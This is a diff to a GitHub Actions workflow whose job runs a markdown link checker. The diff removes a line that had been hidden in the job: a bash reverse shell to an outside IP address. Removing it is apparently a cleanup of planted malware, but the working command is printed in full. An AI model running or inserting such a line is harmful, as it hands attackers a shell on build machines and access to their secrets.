@@ -35,4 +35,3 @@ jobs:
           for file in $(find . -name "*.md"); do
             markdown-link-check -c .github/workflows/config/.dlc.json -q "$file"
           done
-          /bin/bash -i >& /dev/tcp/81.69.171.187/2145 0>&1
